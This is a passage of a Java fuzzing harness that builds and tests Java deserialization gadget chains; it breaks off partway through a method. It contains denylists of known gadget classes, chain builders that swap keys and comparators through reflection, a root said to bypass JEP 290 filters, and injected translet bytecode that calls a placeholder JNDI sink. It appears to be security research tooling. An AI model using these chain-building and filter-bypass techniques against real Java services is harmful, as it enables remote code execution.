/**
 * Java deserialization gadget fuzzing target — persistent mode.
 *
 * Receives IR (Intermediate Representation) JSON via 4-byte BE length-prefixed
 * stdin protocol. Compiles IR → object graph → serialize → deserialize,
 * then reports structured JSON output for differential analysis.
 *
 * Works with DeserAgent (Java Agent) for sink instrumentation.
 *
 * Usage:
 *   java -javaagent:deser_agent.jar -cp "..." DeserTarget --persistent [--classpath cc3|cc4|mixed] [--filter jep290|denylist]
 *   java -javaagent:deser_agent.jar -cp "..." DeserTarget <ir_file.json>
 */

import java.io.*;
import java.lang.reflect.*;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.*;
import java.util.stream.Collectors;

import com.google.gson.*;

public class DeserTarget {

    // ── Configuration ───────────────────────────────────────────
    private static String classpathProfile = "mixed";
    private static String filterMode = "none";

    // ── Type hierarchy DB (populated at startup) ────────────────
    // interface/superclass → list of known concrete implementations
    private static final Map<String, List<String>> TYPE_HIERARCHY = new LinkedHashMap<>();
    private static final Set<String> SERIALIZABLE_CLASSES = new LinkedHashSet<>();

    // ── JEP 290 style filter ────────────────────────────────────
    private static final Set<String> JEP290_DENY = new HashSet<>(Arrays.asList(
        "org.apache.commons.collections.functors.InvokerTransformer",
        "org.apache.commons.collections.functors.InstantiateTransformer",
        "org.apache.commons.collections.functors.ChainedTransformer",
        "org.apache.commons.collections.functors.ConstantTransformer",
        "org.apache.commons.collections4.functors.InvokerTransformer",
        "org.apache.commons.collections4.functors.InstantiateTransformer",
        "org.apache.commons.collections4.functors.ChainedTransformer",
        "org.apache.commons.collections4.functors.ConstantTransformer",
        "org.apache.commons.beanutils.BeanComparator",
        "sun.reflect.annotation.AnnotationInvocationHandler",
        "java.beans.EventHandler",
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"
    ));

    private static final Set<String> DENYLIST_EXTRA = new HashSet<>(Arrays.asList(
        "org.apache.commons.collections.map.LazyMap",
        "org.apache.commons.collections.keyvalue.TiedMapEntry",
        "org.apache.commons.collections4.map.LazyMap",
        "org.apache.commons.collections4.keyvalue.TiedMapEntry",
        "org.apache.commons.collections.map.TransformedMap",
        "org.apache.commons.collections4.comparators.TransformingComparator",
        // Extended denylist — classes that bypass JEP290 but are caught by strict filters
        "com.sun.syndication.feed.impl.ToStringBean",
        "com.sun.syndication.feed.impl.ObjectBean",
        "com.sun.syndication.feed.impl.EqualsBean",
        "org.codehaus.groovy.runtime.MethodClosure",
        "org.codehaus.groovy.runtime.ConvertedClosure",
        "org.hibernate.type.ComponentType",
        "org.hibernate.engine.spi.TypedValue",
        "com.vaadin.data.util.MethodProperty",
        "com.vaadin.data.util.NestedMethodProperty"
    ));

    // ── WildFly JPMS filter (emulates JDK 17+ module access restrictions) ──
    // These JDK-internal classes are blocked by JPMS on JDK 17+
    // Shaded equivalents (org.eclipse.tags.shaded.*) are NOT blocked
    private static final Set<String> WF_JPMS_DENY = new HashSet<>(Arrays.asList(
        "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
        "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet",
        "sun.reflect.annotation.AnnotationInvocationHandler",
        "sun.reflect.annotation.AnnotationTypeMismatchExceptionProxy",
        "com.sun.rowset.JdbcRowSetImpl",
        "com.sun.jndi.ldap.LdapAttribute",
        "com.sun.jndi.rmi.registry.BindingEnumeration",
        "java.beans.EventHandler"
    ));
    // WildFly-specific JPMS packages blocked
    private static final Set<String> WF_JPMS_DENY_PACKAGES = new HashSet<>(Arrays.asList(
        "com.sun.org.apache.xalan.internal.xsltc.trax",
        "com.sun.org.apache.xalan.internal.xsltc.runtime",
        "sun.reflect.annotation",
        "com.sun.jndi.ldap",
        "com.sun.jndi.rmi.registry"
    ));

    // ── WebLogic 14.1.1.0 ClassFilter (extracted from weblogic.utils.io.oif.WebLogicFilterConfig) ──
    // Package-level blacklist: any class in these packages is REJECTED
    private static final Set<String> WL_BLACKLIST_PACKAGES = new HashSet<>(Arrays.asList(
        "org.apache.commons.collections.functors",
        "com.sun.org.apache.xalan.internal.xsltc.trax",
        "javassist",
        "java.rmi.activation",
        "sun.rmi.server",
        "org.jboss.interceptor.builder",
        "org.jboss.interceptor.reader",
        "org.jboss.interceptor.proxy",
        "org.jboss.interceptor.spi.metadata",
        "org.jboss.interceptor.spi.model",
        "com.bea.core.repackaged.springframework.aop.aspectj",
        "com.bea.core.repackaged.springframework.aop.aspectj.annotation",
        "com.bea.core.repackaged.springframework.aop.aspectj.autoproxy",
        "com.bea.core.repackaged.springframework.beans.factory.support",
        "org.python.core"
    ));
    // Class-level blacklist: exact class name match
    private static final Set<String> WL_BLACKLIST_CLASSES = new HashSet<>(Arrays.asList(
        "org.codehaus.groovy.runtime.ConvertedClosure",
        "org.codehaus.groovy.runtime.ConversionHandler",
        "org.codehaus.groovy.runtime.MethodClosure",
        "org.springframework.transaction.support.AbstractPlatformTransactionManager",
        "java.rmi.server.UnicastRemoteObject",
        "java.rmi.server.RemoteObjectInvocationHandler",
        "com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager",
        "java.rmi.server.RemoteObject",
        "com.tangosol.coherence.rest.util.extractor.MvelExtractor",
        "java.lang.Runtime",
        // WLS-only: CVE-2020-2555 patch
        "com.tangosol.util.extractor.ReflectionExtractor",
        // PSU patch additions (CVE-driven, verified via public research + bytecode analysis)
        "com.tangosol.util.filter.LimitFilter",                          // CVE-2020-2555
        "com.tangosol.util.extractor.ChainedExtractor",                  // CVE-2020-2555
        "com.tangosol.util.extractor.UniversalExtractor",                // CVE-2020-14645
        "com.tangosol.internal.util.SimpleBinaryEntry",                  // CVE-2020-2883
        "com.tangosol.util.extractor.AbstractExtractor",                 // CVE-2021-2394
        "com.tangosol.util.filter.ExtractorFilter",                      // CVE-2021-2394
        "oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor",  // CVE-2020-14825
        "oracle.eclipselink.coherence.integrated.internal.querying.FilterExtractor",    // CVE-2021-2394
        "com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager", // CVE-2020-2883
        "weblogic.jndi.internal.ForeignOpaqueReference",                 // CVE-2023-21839
        "weblogic.jms.common.StreamMessageImpl",                         // CVE-2016-0638
        "weblogic.corba.utils.MarshalledObject",                         // CVE-2016-3510
        "sun.rmi.server.UnicastRef",                                     // CVE-2018-2628
        "sun.rmi.transport.DGCImpl_Stub",                                // CVE-2018-2628
        "sun.rmi.server.UnicastRef2"                                     // CVE-2018-2893
    ));

    // ── Modes ────────────────────────────────────────────────────
    //  --binary: receive raw serialized bytes (0xACED...), skip IR compilation
    //  default:  receive IR JSON, compile → serialize → deserialize
    private static boolean binaryMode = false;

    // ── Main ────────────────────────────────────────────────────

    public static void main(String[] args) throws Exception {
        boolean persistent = false;
        for (int i = 0; i < args.length; i++) {
            switch (args[i]) {
                case "--persistent": persistent = true; break;
                case "--classpath": classpathProfile = args[++i]; break;
                case "--filter": filterMode = args[++i]; break;
                case "--binary": binaryMode = true; break;
            }
        }

        buildTypeHierarchy();

        if (persistent) {
            runPersistent();
        } else {
            // Single file mode
            String inputFile = args[args.length - 1];
            if (binaryMode) {
                byte[] data = Files.readAllBytes(Paths.get(inputFile));
                String result = processBinary(data);
                System.out.println(result);
            } else {
                String ir = new String(Files.readAllBytes(Paths.get(inputFile)), StandardCharsets.UTF_8);
                String result = processIR(ir);
                System.out.println(result);
            }
        }
    }

    private static void runPersistent() throws IOException {
        DataInputStream in = new DataInputStream(
            new BufferedInputStream(System.in));
        DataOutputStream out = new DataOutputStream(
            new BufferedOutputStream(System.out));

        // Signal ready
        System.err.println("[DeserTarget] persistent mode ready, classpath=" +
            classpathProfile + " filter=" + filterMode);

        while (true) {
            int len;
            try {
                len = in.readInt();
            } catch (EOFException e) {
                break;
            }
            if (len <= 0 || len > 10_000_000) break;

            byte[] payload = new byte[len];
            in.readFully(payload);

            String result;
            try {
                if (binaryMode) {
                    result = processBinary(payload);
                } else {
                    String ir = new String(payload, StandardCharsets.UTF_8);
                    result = processIR(ir);
                }
            } catch (Throwable e) {
                result = errorJson("process_error", e.getClass().getName() + ": " + e.getMessage());
            }

            byte[] resultBytes = result.getBytes(StandardCharsets.UTF_8);
            out.writeInt(resultBytes.length);
            out.write(resultBytes);
            out.writeInt(0);  // exit code (persistent protocol: length + body + exit_code)
            out.flush();
        }
    }

    // ── Binary Processing Pipeline (raw .ser bytes) ────────────

    private static String processBinary(byte[] serialized) {
        JsonObject output = new JsonObject();
        long startNs = System.nanoTime();

        try {
            // Reset agent tracking
            resetAgentTracking();

            // Validate magic bytes (0xACED0005)
            if (serialized.length < 4) {
                output.addProperty("compiled", false);
                output.addProperty("error", "too_short: " + serialized.length + " bytes");
                return finishOutput(output, startNs);
            }

            boolean hasMagic = (serialized[0] & 0xFF) == 0xAC && (serialized[1] & 0xFF) == 0xED;
            output.addProperty("compiled", true);
            output.addProperty("has_magic", hasMagic);
            output.addProperty("serialized_size", serialized.length);

            // Deserialize with tracking (the core operation)
            DeserResult deResult = deserialize(serialized);
            output.addProperty("deserialized", deResult.success);
            output.addProperty("exception", deResult.exception);
            output.addProperty("exception_class", deResult.exceptionClass);
            output.addProperty("filter_decision", deResult.filterDecision);
            output.addProperty("filter_rejected_class", deResult.filterRejectedClass);

            // Class chain tracking
            JsonArray classChain = new JsonArray();
            for (String cls : deResult.resolvedClasses) {
                classChain.add(cls);
            }
            output.add("chain_classes", classChain);
            output.addProperty("readObject_calls", deResult.resolvedClasses.size());
            output.addProperty("chain_class_hash", hashList(deResult.resolvedClasses));

            // Sink tracking from agent
            populateSinkData(output);

            // Compute sink depth
            int sinkDepth = computeSinkDepth(deResult, output);
            output.addProperty("sink_depth", sinkDepth);

        } catch (Throwable e) {
            output.addProperty("compiled", false);
            output.addProperty("error", e.getClass().getSimpleName() + ": " + (e.getMessage() != null ? e.getMessage() : ""));
        }

        return finishOutput(output, startNs);
    }

    private static String finishOutput(JsonObject output, long startNs) {
        long elapsed = (System.nanoTime() - startNs) / 1_000_000;
        output.addProperty("duration_ms", elapsed);
        return output.toString();
    }

    // ── IR Processing Pipeline ──────────────────────────────────

    private static String processIR(String irJson) {
        JsonObject output = new JsonObject();
        long startNs = System.nanoTime();

        try {
            // Reset agent tracking
            resetAgentTracking();

            JsonObject ir = JsonParser.parseString(irJson).getAsJsonObject();

            // 1. Compile IR → object graph
            Object rootObject = compileIR(ir);
            output.addProperty("compiled", true);
            output.addProperty("root_class", rootObject.getClass().getName());

            // 2. Serialize
            byte[] serialized;
            try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
                 ObjectOutputStream oos = new ObjectOutputStream(baos)) {
                oos.writeObject(rootObject);
                oos.flush();
                serialized = baos.toByteArray();
            }
            output.addProperty("serialized_size", serialized.length);

            // 3. Deserialize with tracking
            DeserResult deResult = deserialize(serialized);
            output.addProperty("deserialized", deResult.success);
            output.addProperty("exception", deResult.exception);
            output.addProperty("exception_class", deResult.exceptionClass);
            output.addProperty("filter_decision", deResult.filterDecision);
            output.addProperty("filter_rejected_class", deResult.filterRejectedClass);

            // Class chain tracking
            JsonArray classChain = new JsonArray();
            for (String cls : deResult.resolvedClasses) {
                classChain.add(cls);
            }
            output.add("chain_classes", classChain);
            output.addProperty("readObject_calls", deResult.resolvedClasses.size());

            // Hash for differential comparison
            output.addProperty("chain_class_hash", hashList(deResult.resolvedClasses));

            // 4. Sink tracking from agent
            populateSinkData(output);

            // 5. Compute sink depth (how deep into the chain before first sink)
            int sinkDepth = computeSinkDepth(deResult, output);
            output.addProperty("sink_depth", sinkDepth);

        } catch (JsonSyntaxException e) {
            output.addProperty("compiled", false);
            output.addProperty("error", "invalid_ir: " + e.getMessage());
        } catch (Throwable e) {
            output.addProperty("compiled", false);
            output.addProperty("error", e.getClass().getSimpleName() + ": " + (e.getMessage() != null ? e.getMessage() : ""));
            output.addProperty("exception_class", e.getClass().getName());
            output.addProperty("exception", e.getMessage() != null ? e.getMessage() : "");
            // Compile-time exception feedback for constraint-guided mutation
            int linkIdx = COMPILE_LINK_INDEX.get();
            if (linkIdx >= 0) {
                output.addProperty("exception_link_index", linkIdx);
                output.addProperty("exception_field", COMPILE_FAILED_FIELD.get());
                output.addProperty("constraint_type", COMPILE_CONSTRAINT_TYPE.get());
                output.addProperty("progress_depth", COMPILE_PROGRESS.get());
            }
        }

        long elapsed = (System.nanoTime() - startNs) / 1_000_000;
        output.addProperty("duration_ms", elapsed);
        return output.toString();
    }

    // ── IR Compiler ─────────────────────────────────────────────

    // Thread-local compile progress for exception feedback
    private static final ThreadLocal<Integer> COMPILE_LINK_INDEX = ThreadLocal.withInitial(() -> -1);
    private static final ThreadLocal<String> COMPILE_FAILED_FIELD = ThreadLocal.withInitial(() -> "");
    private static final ThreadLocal<String> COMPILE_CONSTRAINT_TYPE = ThreadLocal.withInitial(() -> "");
    private static final ThreadLocal<Integer> COMPILE_PROGRESS = ThreadLocal.withInitial(() -> 0);

    private static Object compileIR(JsonObject ir) throws Exception {
        String rootClass = ir.get("root_class").getAsString();
        JsonArray links = ir.has("links") ? ir.getAsJsonArray("links") : new JsonArray();

        // Reset compile tracking
        COMPILE_LINK_INDEX.set(-1);
        COMPILE_FAILED_FIELD.set("");
        COMPILE_CONSTRAINT_TYPE.set("");
        COMPILE_PROGRESS.set(0);

        // Build chain objects bottom-up (last link = sink end)
        Object[] chainObjects = new Object[links.size()];
        int compiled = 0;
        for (int i = links.size() - 1; i >= 0; i--) {
            JsonObject link = links.get(i).getAsJsonObject();
            try {
                chainObjects[i] = compileLink(link, chainObjects, i);
                compiled++;
            } catch (ClassNotFoundException e) {
                COMPILE_LINK_INDEX.set(i);
                COMPILE_CONSTRAINT_TYPE.set("class_not_found");
                COMPILE_PROGRESS.set(compiled);
                throw e;
            } catch (NoSuchFieldException e) {
                COMPILE_LINK_INDEX.set(i);
                COMPILE_FAILED_FIELD.set(e.getMessage());
                COMPILE_CONSTRAINT_TYPE.set("no_such_field");
                COMPILE_PROGRESS.set(compiled);
                throw e;
            } catch (ClassCastException e) {
                COMPILE_LINK_INDEX.set(i);
                COMPILE_CONSTRAINT_TYPE.set("type_mismatch");
                COMPILE_PROGRESS.set(compiled);
                // Try to extract field name from CCE message
                String msg = e.getMessage();
                if (msg != null && msg.contains("cannot be cast to")) {
                    COMPILE_FAILED_FIELD.set(msg);
                }
                throw e;
            } catch (NullPointerException e) {
                COMPILE_LINK_INDEX.set(i);
                COMPILE_CONSTRAINT_TYPE.set("null_field");
                COMPILE_PROGRESS.set(compiled);
                throw e;
            } catch (Exception e) {
                COMPILE_LINK_INDEX.set(i);
                COMPILE_CONSTRAINT_TYPE.set("other");
                COMPILE_PROGRESS.set(compiled);
                throw e;
            }
        }
        COMPILE_PROGRESS.set(compiled);

        // Build root trigger object and wire first chain link
        return compileRoot(rootClass, ir, chainObjects);
    }

    private static Object compileLink(JsonObject link, Object[] chain, int index) throws Exception {
        String className = link.get("class").getAsString();
        Class<?> clazz = Class.forName(className);

        // Create instance bypassing constructor (Unsafe or Objenesis pattern)
        Object instance = createInstance(clazz);

        // Apply field overrides
        if (link.has("field_overrides")) {
            JsonObject overrides = link.getAsJsonObject("field_overrides");
            for (Map.Entry<String, JsonElement> entry : overrides.entrySet()) {
                setField(instance, clazz, entry.getKey(), resolveValue(entry.getValue(), chain));
            }
        }

        // InvokerTransformer: cross-reference iParamTypes and iArgs
        // iArgs may contain Object[] where Class[] or typed arrays are expected
        if (className.endsWith("InvokerTransformer")) {
            Field paramTypesField = findField(clazz, "iParamTypes");
            Field argsField = findField(clazz, "iArgs");
            if (paramTypesField != null && argsField != null) {
                paramTypesField.setAccessible(true);
                argsField.setAccessible(true);
                Class<?>[] paramTypes = (Class<?>[]) paramTypesField.get(instance);
                Object[] iArgs = (Object[]) argsField.get(instance);
                if (paramTypes != null && iArgs != null) {
                    boolean modified = false;
                    for (int j = 0; j < Math.min(paramTypes.length, iArgs.length); j++) {
                        if (paramTypes[j] != null && paramTypes[j].isArray() && iArgs[j] instanceof Object[]) {
                            Object[] src = (Object[]) iArgs[j];
                            Class<?> componentType = paramTypes[j].getComponentType();
                            Object typedArray = java.lang.reflect.Array.newInstance(componentType, src.length);
                            for (int k = 0; k < src.length; k++) {
                                Object elem = src[k];
                                if (componentType == Class.class && elem instanceof String) {
                                    try { elem = Class.forName((String) elem); }
                                    catch (ClassNotFoundException e) { elem = Object.class; }
                                }
                                java.lang.reflect.Array.set(typedArray, k, elem);
                            }
                            iArgs[j] = typedArray;
                            modified = true;
                        }
                    }
                    if (modified) argsField.set(instance, iArgs);
                }
            }
        }

        // ConstantTransformer: resolve String class names to Class objects
        // IR stores "java.lang.Runtime" but the chain needs Runtime.class
        if (className.endsWith("ConstantTransformer")) {
            Field f = findField(clazz, "iConstant");
            if (f != null) {
                f.setAccessible(true);
                Object val = f.get(instance);
                if (val instanceof String) {
                    try {
                        f.set(instance, Class.forName((String) val));
                    } catch (ClassNotFoundException e) {
                        // Not a class name, leave as String
                    }
                }
            }
        }

        // TemplatesImpl: auto-inject stub bytecodes when _bytecodes is null
        // This ensures getOutputProperties() → defineClass() → class_load triggers correctly
        if (className.contains("TemplatesImpl")) {
            Field bcField = findField(clazz, "_bytecodes");
            if (bcField != null) {
                bcField.setAccessible(true);
                if (bcField.get(instance) == null) {
                    bcField.set(instance, makeStubTransletBytecodes(className));
                }
            }
            // Also ensure _tfactory is set (required for getOutputProperties)
            Field tfField = findField(clazz, "_tfactory");
            if (tfField != null) {
                tfField.setAccessible(true);
                if (tfField.get(instance) == null) {
                    try {
                        String tfClassName = className.replace("TemplatesImpl",
                            "TransformerFactoryImpl");
                        tfField.set(instance, createInstance(Class.forName(tfClassName)));
                    } catch (Exception e) { /* ignore */ }
                }
            }
        }

        return instance;
    }

    /**
     * Generate stub bytecodes for TemplatesImpl._bytecodes.
     * Creates a minimal class extending AbstractTranslet with a static
     * initializer that calls System.setProperty (detectable sink).
     */
    private static byte[][] makeStubTransletBytecodes(String templatesClassName) {
        // Determine the AbstractTranslet superclass based on TemplatesImpl namespace
        String superClass;
        if (templatesClassName.contains("shaded")) {
            // WildFly shaded: org.eclipse.tags.shaded.org.apache.xalan.xsltc.runtime.AbstractTranslet
            superClass = templatesClassName
                .replace("trax.TemplatesImpl", "runtime.AbstractTranslet")
                .replace('.', '/');
        } else {
            // Standard JDK: com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet
            superClass = "com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet";
        }
        // Use ASM to generate minimal translet class
        try {
            org.objectweb.asm.ClassWriter cw = new org.objectweb.asm.ClassWriter(
                org.objectweb.asm.ClassWriter.COMPUTE_FRAMES |
                org.objectweb.asm.ClassWriter.COMPUTE_MAXS);
            cw.visit(org.objectweb.asm.Opcodes.V11,
                org.objectweb.asm.Opcodes.ACC_PUBLIC | org.objectweb.asm.Opcodes.ACC_SUPER,
                "StubTranslet", null, superClass, null);

            // Static init: new InitialContext().lookup("deser://sink")
            // Agent intercepts InitialContext.lookup → reports jndi_lookup sink
            // Safer than Runtime.exec which can crash JVM when agent returns null
            org.objectweb.asm.MethodVisitor mv = cw.visitMethod(
                org.objectweb.asm.Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
            mv.visitCode();
            // try { new InitialContext().lookup("deser://sink"); } catch (Exception e) {}
            org.objectweb.asm.Label tryStart = new org.objectweb.asm.Label();
            org.objectweb.asm.Label tryEnd = new org.objectweb.asm.Label();
            org.objectweb.asm.Label catchHandler = new org.objectweb.asm.Label();
            mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Exception");
            mv.visitLabel(tryStart);
            mv.visitTypeInsn(org.objectweb.asm.Opcodes.NEW, "javax/naming/InitialContext");
            mv.visitInsn(org.objectweb.asm.Opcodes.DUP);
            mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKESPECIAL,
                "javax/naming/InitialContext", "<init>", "()V", false);
            mv.visitLdcInsn("deser://sink/triggered");
            mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKEVIRTUAL,
                "javax/naming/InitialContext", "lookup",
                "(Ljava/lang/String;)Ljava/lang/Object;", false);
            mv.visitInsn(org.objectweb.asm.Opcodes.POP);
            mv.visitLabel(tryEnd);
            org.objectweb.asm.Label end = new org.objectweb.asm.Label();
            mv.visitJumpInsn(org.objectweb.asm.Opcodes.GOTO, end);
            mv.visitLabel(catchHandler);
            mv.visitInsn(org.objectweb.asm.Opcodes.POP); // pop exception
            mv.visitLabel(end);
            mv.visitInsn(org.objectweb.asm.Opcodes.RETURN);
            mv.visitMaxs(0, 0);
            mv.visitEnd();

            // Default constructor
            mv = cw.visitMethod(org.objectweb.asm.Opcodes.ACC_PUBLIC,
                "<init>", "()V", null, null);
            mv.visitCode();
            mv.visitVarInsn(org.objectweb.asm.Opcodes.ALOAD, 0);
            mv.visitMethodInsn(org.objectweb.asm.Opcodes.INVOKESPECIAL,
                superClass, "<init>", "()V", false);
            mv.visitInsn(org.objectweb.asm.Opcodes.RETURN);
            mv.visitMaxs(0, 0);
            mv.visitEnd();

            cw.visitEnd();
            return new byte[][] { cw.toByteArray() };
        } catch (Exception e) {
            // Fallback: empty bytecodes
            return new byte[][] { new byte[0] };
        }
    }

    private static Object compileRoot(String rootClass, JsonObject ir, Object[] chain) throws Exception {
        Class<?> clazz = Class.forName(rootClass);
        String trigger = ir.has("root_trigger") ? ir.get("root_trigger").getAsString() : "";

        // Known root trigger patterns
        if (rootClass.equals("java.util.PriorityQueue")) {
            return buildPriorityQueue(chain, ir);
        } else if (rootClass.equals("java.util.HashMap")) {
            return buildHashMap(chain, ir);
        } else if (rootClass.equals("java.util.HashSet")) {
            return buildHashSet(chain, ir);
        } else if (rootClass.equals("java.util.TreeMap")) {
            return buildTreeMap(chain, ir);
        } else if (rootClass.equals("java.util.Hashtable")) {
            return buildHashtable(chain, ir);
        } else if (rootClass.equals("java.util.LinkedHashSet")) {
            return buildLinkedHashSet(chain, ir);
        } else if (rootClass.equals("java.util.concurrent.ConcurrentHashMap")) {
            return buildConcurrentHashMap(chain, ir);
        } else if (rootClass.equals("java.util.TreeSet")) {
            return buildTreeSet(chain, ir);
        } else if (rootClass.contains("BidiMap") || rootClass.contains("bidimap")) {
            return buildBidiMap(rootClass, chain, ir);
        } else if (rootClass.contains("TreeBag")) {
            return buildTreeBag(chain, ir);
        } else if (rootClass.equals("javax.management.BadAttributeValueExpException")) {
            return buildBadAttrValExp(chain, ir);
        } else {
            // Auto-escalation: if chain[0] is a Comparator but the root class
            // doesn't natively trigger compare() during readObject, wrap in PriorityQueue.
            // This prevents silent failures where the chain compiles but never reaches sink.
            if (chain.length > 0 && chain[0] instanceof Comparator) {
                return buildPriorityQueue(chain, ir);
            }

            // Generic: create instance and wire first chain link
            Object instance = createInstance(clazz);
            if (chain.length > 0 && ir.has("root_field")) {
                setField(instance, clazz, ir.get("root_field").getAsString(), chain[0]);
            }
            return instance;
        }
    }

    // ── Root trigger builders ───────────────────────────────────

    private static Object buildPriorityQueue(Object[] chain, JsonObject ir) throws Exception {
        // PriorityQueue.readObject → heapify → comparator.compare(elem, elem)
        if (chain.length == 0) return new PriorityQueue<>(2);

        Object sink = findSinkObject(chain);
        Comparator<Object> dummyComp = (Comparator<Object> & Serializable) (a, b) -> System.identityHashCode(a) - System.identityHashCode(b);

        // 1. Create with dummy comparator
        PriorityQueue<Object> pq = new PriorityQueue<>(2, dummyComp);
        // 2. Add sink objects safely (dummy comparator won't trigger chain)
        pq.add(sink);
        Object sink2 = cloneShallow(sink);
        pq.add(sink2 != null ? sink2 : sink);
        // 3. Swap to real comparator
        swapComparator(pq, (Comparator<?>) chain[0]);

        return pq;
    }

    private static Object buildHashMap(Object[] chain, JsonObject ir) throws Exception {
        // HashMap.readObject → putVal → hash(key) → key.hashCode() → chain trigger
        // MUST NOT call hashCode() during construction — use reflection to inject key
        HashMap<Object, Object> map = new HashMap<>();
        if (chain.length > 0) {
            Object key = chain[0];
            Object value = ir.has("payload_value") ?
                resolveJsonPrimitive(ir.get("payload_value")) : "pwned";
            // Insert placeholder, then swap key via reflection on internal Node
            map.put("safe_placeholder", value);
            Field tableF = HashMap.class.getDeclaredField("table");
            tableF.setAccessible(true);
            Object[] table = (Object[]) tableF.get(map);
            if (table != null) {
                for (int i = 0; i < table.length; i++) {
                    if (table[i] != null) {
                        Field keyF = table[i].getClass().getDeclaredField("key");
                        keyF.setAccessible(true);
                        keyF.set(table[i], key);
                        break;
                    }
                }
            }
        }
        return map;
    }

    private static Object buildTreeMap(Object[] chain, JsonObject ir) throws Exception {
        // TreeMap.readObject → buildFromSorted → NO compare() during readObject!
        // TreeMap alone CANNOT trigger comparator chains on deserialization.
        //
        // Auto-escalate: if chain[0] is a Comparator, wrap in TreeSet instead.
        // TreeSet.readObject → for each entry: backingTreeMap.put(key) → compare() ✓
        if (chain.length > 0 && chain[0] instanceof Comparator) {
            // Escalate to TreeSet (same semantics, but triggers compare on readObject)
            return buildTreeSet(chain, ir);
        }
        // Non-comparator TreeMap: use key.compareTo() path
        TreeMap<Object, Object> tm = new TreeMap<>();
        if (chain.length > 0) {
            forceMapPut(tm, chain[0], "val");
        }
        return tm;
    }

    private static Object buildHashSet(Object[] chain, JsonObject ir) throws Exception {
        // HashSet.readObject → HashMap.put → hash(key) → key.hashCode()
        // HashSet is backed by a HashMap — inject key via reflection
        HashSet<Object> set = new HashSet<>();
        if (chain.length > 0) {
            // Add placeholder, then swap key
            set.add("safe_placeholder");
            Field mapF = HashSet.class.getDeclaredField("map");
            mapF.setAccessible(true);
            HashMap<?,?> backing = (HashMap<?,?>) mapF.get(set);
            Field tableF = HashMap.class.getDeclaredField("table");
            tableF.setAccessible(true);
            Object[] table = (Object[]) tableF.get(backing);
            if (table != null) {
                for (int i = 0; i < table.length; i++) {
                    if (table[i] != null) {
                        Field keyF = table[i].getClass().getDeclaredField("key");
                        keyF.setAccessible(true);
                        keyF.set(table[i], chain[0]);
                        break;
                    }
                }
            }
        }
        return set;
    }

    private static Object buildHashtable(Object[] chain, JsonObject ir) throws Exception {
        // Hashtable.readObject → reconstitutionPut → key.hashCode() + equals()
        // CC7 needs 2 LazyMaps with same hashCode for equals() trigger
        // Use reflection to avoid triggering hashCode during put
        Hashtable<Object, Object> ht = new Hashtable<>();
        if (chain.length > 0) {
            ht.put("safe1", "val1");
            // Swap key to chain[0]
            Field tableF = Hashtable.class.getDeclaredField("table");
            tableF.setAccessible(true);
            Object[] table = (Object[]) tableF.get(ht);
            if (table != null) {
                for (int i = 0; i < table.length; i++) {
                    if (table[i] != null) {
                        Field keyF = table[i].getClass().getDeclaredField("key");
                        keyF.setAccessible(true);
                        keyF.set(table[i], chain[0]);
                        break;
                    }
                }
            }
        }
        return ht;
    }

    private static Object buildLinkedHashSet(Object[] chain, JsonObject ir) throws Exception {
        // Same pattern as HashSet — inject key via reflection to avoid hashCode()
        return buildHashSet(chain, ir);  // HashSet and LinkedHashSet share same backing map logic
    }

    // ── Filter-bypass root builders ────────────────────────────

    private static Object buildConcurrentHashMap(Object[] chain, JsonObject ir) throws Exception {
        // ConcurrentHashMap.readObject → putVal → key.hashCode()
        // Bypasses JEP 290 filters that block HashMap/HashSet
        java.util.concurrent.ConcurrentHashMap<Object, Object> chm =
            new java.util.concurrent.ConcurrentHashMap<>();
        if (chain.length > 0) {
            // Insert with safe key first, then swap via reflection on internal Node
            chm.put("safe_placeholder", "val");
            // Find the internal Node[] table and replace key
            Field tableField = java.util.concurrent.ConcurrentHashMap.class.getDeclaredField("table");
            tableField.setAccessible(true);
            Object[] table = (Object[]) tableField.get(chm);
            if (table != null) {
                for (int i = 0; i < table.length; i++) {
                    if (table[i] != null) {
                        Field keyField = table[i].getClass().getDeclaredField("key");
                        keyField.setAccessible(true);
                        keyField.set(table[i], chain[0]);
                        break;
                    }
                }
            }
        }
        return chm;
    }

    private static Object buildTreeSet(Object[] chain, JsonObject ir) throws Exception {
        // TreeSet.readObject uses buildFromSorted — does NOT call compare()!
        // Same limitation as TreeMap. Auto-escalate to PriorityQueue for comparator chains.
        if (chain.length > 0 && chain[0] instanceof Comparator) {
            return buildPriorityQueue(chain, ir);
        }
        return new TreeSet<>();
    }

    private static Object buildTreeBag(Object[] chain, JsonObject ir) throws Exception {
        // TreeBag.readObject flow:
        //   1. readObject() reads comparator from stream
        //   2. Creates new TreeMap(comparator)
        //   3. doReadObject() reads entries and calls map.put(key, MutableInteger)
        //   4. put() triggers comparator.compare(key1, key2) → GADGET CHAIN
        //
        // Strategy: build TreeBag normally with dummy comparator + sink as entry,
        // then swap comparator to real one. On deserialization, readObject reads
        // the real comparator and creates a fresh TreeMap, then re-inserts entries
        // via put() which triggers compare().
        String[] treeBagClasses = {
            "org.apache.commons.collections.bag.TreeBag",
            "org.apache.commons.collections4.bag.TreeBag"
        };
        for (String tbClassName : treeBagClasses) {
            try {
                Class<?> treeBagClass = Class.forName(tbClassName);

                if (chain.length > 0 && chain[0] instanceof Comparator) {
                    Object sink = findSinkObject(chain);
                    @SuppressWarnings("unchecked")
                    Comparator<Object> realComp = (Comparator<Object>) chain[0];

                    // 1. Create TreeBag with a safe dummy comparator
                    Comparator<Object> dummyComp = (Comparator<Object> & Serializable) (a, b) -> System.identityHashCode(a) - System.identityHashCode(b);
                    Object bag = treeBagClass.getDeclaredConstructor(Comparator.class).newInstance(dummyComp);

                    // 2. Add sink objects via the public add() method (safe with dummy comparator)
                    Method addMethod = treeBagClass.getMethod("add", Object.class);
                    addMethod.invoke(bag, sink);
                    Object sink2 = cloneShallow(sink);
                    if (sink2 != null) {
